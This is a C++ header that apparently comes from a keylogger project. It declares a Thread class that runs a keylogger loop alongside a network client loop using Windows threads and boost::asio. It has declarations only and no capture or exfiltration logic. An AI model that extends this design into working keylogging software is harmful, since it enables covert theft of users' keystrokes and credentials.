#pragma once

#include <strsafe.h>
#include <tchar.h>
#include "Client.h"
#include "Keylogger.h"
#include "Com.h"

#define MAX_THREADS 2
#define BUF_SIZE 255

class Thread {
private:
	typedef struct MyData {
		Keylogger				*kLogger;
		Com						*com;
		Client					*client;
		boost::asio::io_service *io_service;
	}							MYDATA, *PMYDATA;
	PMYDATA _pDataArray[MAX_THREADS];
	DWORD   _dwThreadIdArray[MAX_THREADS];
	HANDLE  _hThreadArray[MAX_THREADS];

	static DWORD WINAPI CLoop(LPVOID lpParam);
	static DWORD WINAPI KLoop(LPVOID lpParam);
public:
	int		InitThreads(Keylogger &kLogger, Com &com);
	void	ErrorHandler(LPTSTR lpszFunction);
	void	CloseThread(void);
};